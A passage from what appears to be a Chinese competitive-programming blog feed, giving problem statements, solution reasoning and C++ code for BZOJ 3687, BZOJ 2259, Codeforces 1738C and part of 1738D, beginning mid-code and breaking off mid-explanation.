class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;n, &amp;l, &amp;k);</span><br><span class="line">    k += MAXN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;p[i]);</span><br><span class="line">        p[i] /= <span class="number">100.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">double</span> f[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>][<span class="number">2</span> * MAXN + <span class="number">1</span>];</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>][k] = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> left = k, right = k;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> m = left; m &lt;= right; m++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (f[i - <span class="number">1</span>][j][m] != <span class="number">0</span>) &#123;</span><br><span class="line">                    f[i][j + <span class="number">1</span>][std::<span class="built_in">min</span>(MAXN + n, m + a[i])] += f[i - <span class="number">1</span>][j][m] * p[i];</span><br><span class="line">                    f[i][j][m] += f[i - <span class="number">1</span>][j][m] * (<span class="number">1.0</span> - p[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a[i] == <span class="number">-1</span>) left--;</span><br><span class="line">        <span class="keyword">else</span> right += a[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = l; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = MAXN; j &lt;= right; j++) &#123;</span><br><span class="line">            ans += f[n][i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.6f\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>概率与期望</tag>
        <tag>Tyvj</tag>
        <tag>BZOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>「BZOJ 3687」简单题 - 位运算</title>
    <url>/bzoj-3687/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://hydro.ac/d/bzoj/p/3687">HydroOJ 链接</a></p>
<p>求一个有 <span class="math inline">\(n\)</span> 的元素的可重数集
<span class="math inline">\(\{a_i\}\)</span>
的子集的算术和的异或和。</p>
<p>数据范围：<span class="math inline">\(a_i &gt; 0\)</span>，<span
class="math inline">\(1 &lt; n &lt; 1000\)</span>，<span
class="math inline">\(\sum a_i \le 2000000\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题有一种位运算的妙解。</p>
<p>首先对于 <span class="math inline">\(\sum a_i \le
2000000\)</span>，我们可以直接开一个大小为 <span
class="math inline">\(2000000\)</span> 的 <code>bitset</code>
来存储算术和的情况。</p>
<p>定义 <span class="math inline">\(f_i\)</span> 表示算术和 <span
class="math inline">\(i\)</span> 是否对答案有效。由于最终为异或和，当
<span class="math inline">\(i\)</span> 出现次数为偶数时，我们就可忽略
<span class="math inline">\(i\)</span>，即 <span
class="math inline">\(f_i = \text{false}\)</span>。</p>
<p>每对于一个新增的数 <span
class="math inline">\(a\)</span>，我们有两种情况：</p>
<ul>
<li>算术和没有 <span class="math inline">\(a\)</span>，则 <span
class="math inline">\(f\)</span> 保持原样。</li>
<li>算数和有 <span class="math inline">\(a\)</span>，则对于 <span
class="math inline">\(f\)</span> 中所有为 <code>true</code> 的情况加上
<code>a</code>。反应在 <code>bitset</code> 上为
<code>f &lt;&lt; a</code>。</li>
</ul>
<p>将两者异或就可得出 <code>f</code> 中的反映到 <code>a</code>
的所有算术和情况。最后将 <code>f</code> 中所有为 <code>true</code>
的情况求异或和即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1000</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXS = <span class="number">2000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">static</span> std::bitset&lt;MAXS + 1&gt; f;</span><br><span class="line">    f[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">        sum += a;</span><br><span class="line">        f ^= (f &lt;&lt; a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= sum; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (f[i]) &#123;</span><br><span class="line">            ans ^= i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
        <tag>BZOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>「BZOJ 2259」新型计算机 - 最短路</title>
    <url>/bzoj-2259/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://hydro.ac/d/bzoj/p/2259">HydroOJ 链接</a></p>
<p>Tim
正在摆弄着他设计的“计算机”，他认为这台计算机原理很独特，因此利用它可以解决许多难题。
但是，有一个难题他却解决不了，是这台计算机的输入问题。新型计算机的输入也很独特，假设输入序列中有一些数字（都是自然数——自然数包括
<span class="math inline">\(0\)</span> ），计算机先读取第一个数字 <span
class="math inline">\(s_1\)</span> ，然后顺序向后读入 <span
class="math inline">\(s_1\)</span> 个数字。接着再读一个数字 <span
class="math inline">\(s_2\)</span> ，顺序向后读入 <span
class="math inline">\(s_2\)</span>
个数字……依此类推。不过只有计算机正好将输入序列中的数字读完，它才能正确处理数据，否则计算机就会进行自毁性操作！</p>
<p>Tim
现在有一串输入序列。但可能不是合法的，也就是可能会对计算机造成破坏。于是他想对序列中的每一个数字做一些更改，加上一个数或者减去一个数，当然，仍然保持其为自然数。使得更改后的序列为一个新型计算机可以接受的合法序列。</p>
<p>不过 Tim
还希望更改的总代价最小，所谓总代价，就是对序列中每一个数操作的参数的绝对值之和。</p>
<p>写一个程序：</p>
<ol type="1">
<li>从文件中读入原始的输入序列；</li>
<li>计算将输入序列改变为合法序列需要的最小代价；</li>
<li>向输出文件打印结果。</li>
</ol>
<p><span class="math inline">\(100\%\)</span> 的数据满足：<span
class="math inline">\(n &lt; 1 \times 10^6 + 1\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然这是图论问题。我们可以抽象成对于一个序列 <span
class="math inline">\(\{a_n\}\)</span>，可从 <span
class="math inline">\(i\)</span> 跳到 <span class="math inline">\(i +
a_i + 1\)</span>，要求跳到 <span class="math inline">\(n +
1\)</span>。可以对 <span class="math inline">\(a_i\)</span>
修改，代价为修改的绝对值，问最小代价。</p>
<p>我们可以连边 <span class="math inline">\(i
\stackrel{0}{\longrightarrow} i + a_i + 1\)</span>，即从 <span
class="math inline">\(i\)</span> 到 <span class="math inline">\(i + a_i
+ 1\)</span> 的权值为 <span class="math inline">\(0\)</span>
的边。对于修改，我们可以对于 <span class="math inline">\(\forall i \in
(1, n]\)</span>，连边 <span class="math inline">\(i
\stackrel{1}{\longrightarrow} i + 1\)</span>、<span
class="math inline">\(i \stackrel{1}{\longrightarrow} i - 1\)</span>
即可模拟修改过程。而对于修改超出 <span class="math inline">\(n\)</span>
的，即 <span class="math inline">\(i + a_i + 1 &gt;
n\)</span>，我们可以连边 <span class="math inline">\(i \stackrel{i + a_i
- n}{\longrightarrow} n + 1\)</span>。</p>
<p>最后求最短路即可，可以用堆优化的
Dijkstra。本题略卡常，加个快读快写可过。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e6</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="type">int</span> d;</span><br><span class="line">    <span class="type">bool</span> v;</span><br><span class="line">&#125; N[MAXN + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> s, t;</span><br><span class="line">    <span class="type">int</span> w;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(<span class="type">int</span> s, <span class="type">int</span> t, <span class="type">int</span> w) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t), <span class="built_in">w</span>(w) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> t, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    N[s].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(s, t, w));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">dijkstra</span><span class="params">(<span class="type">const</span> <span class="type">int</span> s, <span class="type">const</span> <span class="type">int</span> t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n + <span class="number">1</span>; i++) N[i].d = INT_MAX;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> std::priority_queue&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, std::vector&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt;, std::greater&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; &gt; q;</span><br><span class="line">    N[s].d = <span class="number">0</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(std::<span class="built_in">make_pair</span>(<span class="number">0</span>, s));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; p = q.<span class="built_in">top</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> v = p.second;</span><br><span class="line">        <span class="keyword">if</span> (N[v].v) <span class="keyword">continue</span>;</span><br><span class="line">        N[v].v = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Edge &amp;e : N[v].e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (N[e.t].d &gt; N[v].d + e.w) &#123;</span><br><span class="line">                N[e.t].d = N[v].d + e.w;</span><br><span class="line">                q.<span class="built_in">push</span>(std::<span class="built_in">make_pair</span>(N[e.t].d, e.t));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> N[t].d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">IO</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE (1 &lt;&lt; 20)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> isdigit(x) (x &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; x &lt;= <span class="string">&#x27;9&#x27;</span>)</span></span><br><span class="line">    <span class="type">char</span> buf[MAXSIZE], *p1, *p2;</span><br><span class="line">    <span class="type">char</span> pbuf[MAXSIZE], *pp;</span><br><span class="line">    <span class="built_in">IO</span>() : <span class="built_in">p1</span>(buf), <span class="built_in">p2</span>(buf), <span class="built_in">pp</span>(pbuf) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">IO</span>() &#123; <span class="built_in">fwrite</span>(pbuf, <span class="number">1</span>, pp - pbuf, stdout); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">char</span> <span class="title">gc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p1 == p2) p2 = (p1 = buf) + <span class="built_in">fread</span>(buf, <span class="number">1</span>, MAXSIZE, stdin);</span><br><span class="line">        <span class="keyword">return</span> p1 == p2 ? <span class="string">&#x27; &#x27;</span> : *p1++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">bool</span> <span class="title">blank</span><span class="params">(<span class="type">char</span> ch)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ch == <span class="string">&#x27; &#x27;</span> || ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\r&#x27;</span> || ch == <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span> </span>&#123;</span><br><span class="line">        <span class="type">double</span> tmp = <span class="number">1</span>;</span><br><span class="line">        <span class="type">bool</span> sign = <span class="number">0</span>;</span><br><span class="line">        x = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> ch = <span class="built_in">gc</span>();</span><br><span class="line">        <span class="keyword">for</span> (; !<span class="built_in">isdigit</span>(ch); ch = <span class="built_in">gc</span>())</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&#x27;-&#x27;</span>) sign = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (; <span class="built_in">isdigit</span>(ch); ch = <span class="built_in">gc</span>()) x = x * <span class="number">10</span> + (ch - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            <span class="keyword">for</span> (ch = <span class="built_in">gc</span>(); <span class="built_in">isdigit</span>(ch); ch = <span class="built_in">gc</span>())</span><br><span class="line">                tmp /= <span class="number">10.0</span>, x += tmp * (ch - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sign) x = -x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(<span class="type">char</span> *s)</span> </span>&#123;</span><br><span class="line">        <span class="type">char</span> ch = <span class="built_in">gc</span>();</span><br><span class="line">        <span class="keyword">for</span> (; <span class="built_in">blank</span>(ch); ch = <span class="built_in">gc</span>()) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (; !<span class="built_in">blank</span>(ch); ch = <span class="built_in">gc</span>()) *s++ = ch;</span><br><span class="line">        *s = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">read</span><span class="params">(<span class="type">char</span> &amp;c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (c = <span class="built_in">gc</span>(); <span class="built_in">blank</span>(c); c = <span class="built_in">gc</span>()) <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pp - pbuf == MAXSIZE) <span class="built_in">fwrite</span>(pbuf, <span class="number">1</span>, MAXSIZE, stdout), pp = pbuf;</span><br><span class="line">        *pp++ = c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">write</span><span class="params">(T x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span>) x = -x, <span class="built_in">push</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">        <span class="type">static</span> T sta[<span class="number">35</span>];</span><br><span class="line">        T top = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sta[top++] = x % <span class="number">10</span>, x /= <span class="number">10</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (x);</span><br><span class="line">        <span class="keyword">while</span> (top) <span class="built_in">push</span>(sta[--top] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">write</span><span class="params">(T x, <span class="type">char</span> lastChar)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">write</span>(x), <span class="built_in">push</span>(lastChar);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; io;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    io.<span class="built_in">read</span>(n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        io.<span class="built_in">read</span>(a);</span><br><span class="line">        <span class="keyword">if</span> (i + a &lt;= n) <span class="built_in">addEdge</span>(i, i + a + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">addEdge</span>(i, n + <span class="number">1</span>, i + a - n);</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">addEdge</span>(i, i + <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">addEdge</span>(i, i - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io.<span class="built_in">write</span>(<span class="built_in">dijkstra</span>(<span class="number">1</span>, n + <span class="number">1</span>), <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>BZOJ</tag>
        <tag>图论</tag>
        <tag>最短路</tag>
      </tags>
  </entry>
  <entry>
    <title>「Codeforces 1738C」Even Number Addicts - 博弈论</title>
    <url>/cf-1738c/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://codeforces.com/problemset/problem/1738/C">Codeforces
链接</a></p>
<p>Alice 和 Bob 玩一个游戏，这个游戏中有一个有 <span
class="math inline">\(n\)</span> 项的序列 <span
class="math inline">\(a\)</span>，Alice 先手，两人轮流在 <span
class="math inline">\(a\)</span> 中取走一个数。若最终取完后 Alice
取走的数的和为偶数则 Alice 获胜，否则 Bob
获胜。若两人均按最优策略决策，求出最终的获胜方。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>目前问题过于复杂，我们可以先考虑一个简单问题：若序列 <span
class="math inline">\(n\)</span> 中只有奇数，谁会赢？</p>
<p>这个问题答案显然。若 <span class="math inline">\(n \bmod 4 =
1\)</span> 或 <span class="math inline">\(n \bmod 4 = 2\)</span> 时 Bob
赢，否则 Alice 赢。</p>
<p>接下来我们把偶数加进来，我们设奇数个数为 <span
class="math inline">\(\text{cnt1}\)</span>，偶数个数为 <span
class="math inline">\(\text{cnt0}\)</span>。对于 <span
class="math inline">\(\text{cnt0} \bmod 2 = 0\)</span> 的情况与 <span
class="math inline">\(n\)</span>
全为奇数的情况相同。因为只要其中有一个人选了偶数，则下一个人立即选偶数，相当于转化为
<span class="math inline">\(\text{cnt0} - 2\)</span>
的局面，这样周而复始可将 <span
class="math inline">\(\text{cnt0}\)</span> 消为 <span
class="math inline">\(0\)</span>。且后手跟着先手选偶数的抉择对于 Alice
和 Bob 均是最优策略。</p>
<p>接下来我们考虑 <span class="math inline">\(\text{cnt0} \bmod 2 =
1\)</span> 的情况。我们依然可以将 <span
class="math inline">\(\text{cnt1} \bmod 4\)</span> 的情况分类讨论：当
<span class="math inline">\(\text{cnt1} \bmod 4 = 1\)</span> 时，Alice
最优策略是取走“唯一的”偶数，然后 Alice 必胜；当 <span
class="math inline">\(\text{cnt1} \bmod 4 = 0\)</span> 或 <span
class="math inline">\(\text{cnt1} \bmod 4 = 3\)</span> 时，Alice
最优策略是无论如何都不取“唯一的”偶数，然后 Alice 必胜；当 <span
class="math inline">\(\text{cnt1} \bmod 4 = 2\)</span> 时，无论 Alice
取不取“唯一的”偶数，Bob 都必胜。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> cnt0 = <span class="number">0</span>, cnt1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">        <span class="keyword">if</span> (a % <span class="number">2</span>)</span><br><span class="line">            cnt1++;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cnt0++;</span><br><span class="line">        cnt0 &amp;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cnt0 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((cnt1 % <span class="number">4</span> == <span class="number">1</span> || cnt1 % <span class="number">4</span> == <span class="number">2</span>))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((cnt1 % <span class="number">4</span> == <span class="number">1</span> || cnt1 % <span class="number">4</span> == <span class="number">3</span> || cnt1 % <span class="number">4</span> == <span class="number">0</span>))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Bob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>博弈论</tag>
        <tag>Codeforces</tag>
      </tags>
  </entry>
  <entry>
    <title>「Codeforces 1738D」Permutation Addicts - 图论 + DFS</title>
    <url>/cf-1738d/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://codeforces.com/contest/1738/problem/D">Codeforces
链接</a></p>
<p>有一个 <span class="math inline">\(n\)</span> 个数的排列 <span
class="math inline">\(a\)</span> 和一个数 <span class="math inline">\(k
(0 \le k \le n)\)</span>，你计算出了一个有 <span
class="math inline">\(n\)</span> 个数的序列 <span
class="math inline">\(b\)</span>，计算方法如下：</p>
<ul>
<li>当 <span class="math inline">\(a_i \le k\)</span> 时，若存在 <span
class="math inline">\(a_j &gt; k (1 \le j &lt; i)\)</span> 且 <span
class="math inline">\(i - j\)</span> 最小，则 <span
class="math inline">\(b_{a_i} = a_j\)</span>，否则 <span
class="math inline">\(b_{a_i} = n + 1\)</span>；</li>
<li>当 <span class="math inline">\(a_i &gt; k\)</span> 时，若存在 <span
class="math inline">\(a_j \le k (1 \le j &lt; i)\)</span> 且 <span
class="math inline">\(i - j\)</span> 最小，则 <span
class="math inline">\(b_{a_i} = a_j\)</span>，否则 <span
class="math inline">\(b_{a_i} = 0\)</span>。</li>
</ul>
<p>目前你知道 <span class="math inline">\(b\)</span> 与 <span
class="math inline">\(n\)</span>，请求出任意一种 <span
class="math inline">\(a\)</span> 及对应的 <span
class="math inline">\(k\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>分析可得对于 <span class="math inline">\(i \le k\)</span>，满足 <span
class="math inline">\(b_i &gt; i\)</span>；对于 <span
class="math inline">\(i &gt; k\)</span>，满足 <span
class="math inline">\(b_i &lt; i\)</span>。证明显然。这样我们可求出
<span class="math inline">\(k\)</span>。</p>
<p>对于每个 <span class="math inline">\(b_i\)</span>，若 <span
class="math inline">\(i \neq n + 1\)</span> 且 <span
class="math inline">\(i \neq 0\)</span>，显然 <span
class="math inline">\(b_i\)</span> 在 <span
class="math inline">\(i\)</span> 的后面，若有 <span
class="math inline">\(m\)</span> 个 <span class="math inline">\(b_i =
0\)</span> 或 <span class="math inline">\(b_i = n + 1\)</span>，则这
<span class="math inline">\(m\)</span> 个数必定在前 <span
class="math inline">\(m\)</span> 位，且 <span class="math inline">\(b_i
= 0\)</span> 和 <span class="math inline">\(b_i = n + 1\)</span>
两者必定有且只有一者出现。于是我们可以直接建树，连边 <span
class="math inline">\(i \rightarrow b_i\)</span>，然后对 <span
class="math inline">\(0\)</span> 或 <span class="math inline">\(n +
1\)</span> 进行 DFS 即可。对于一个节点 <span
class="math inline">\(u\)</span>，它的子节点中若有以节点 <span
class="math inline">\(v\)</span> 为根的子树大于 <span
class="math inline">\(1\)</span>，就最后遍历 <span
class="math inline">\(v\)</span>
即可。显然对于每个节点至多只有一个子节点为根的子树大小大于 <span
class="math inline">\(1\)</span>。</p>
